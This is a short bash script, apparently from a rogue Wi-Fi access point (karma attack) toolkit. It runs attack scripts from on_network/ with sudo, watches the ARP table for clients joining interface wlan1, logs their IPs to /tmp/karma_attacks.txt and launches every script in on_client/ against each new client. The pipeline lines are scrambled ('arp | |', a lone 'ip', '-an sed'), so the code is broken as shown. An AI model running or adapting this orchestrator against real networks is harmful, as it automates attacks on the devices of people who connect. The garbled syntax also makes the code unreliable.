#!/bin/bash

GREEN=$'\x1b[32m'

RESET=$'\x1b[39m'

IFACE='wlan1'

#~/gui.sh

rm /tmp/karma_attacks.txt 2> /dev/null

for script in $(find on_network/ -type f -perm -u+x)

do

exec sudo $script $IFACE "" &

done

while sleep 1

do

arp | |

ip

-an sed -rn "s/\? \(([^\)]+)\) .*\[ether\] on $IFACE/\1/p"

while read

do

egrep -q "^$ip$" /tmp/karma_attacks.txt 2> /dev/null && continue

|| echo "$ip" >> /tmp/karma_attacks.txt

echo $GREEN "client detected $ip" $RESET

for script in $(find on_client/ -type f -perm -u+x)

do

exec $script $ip "" 11.0.0.1 &

done

done

done
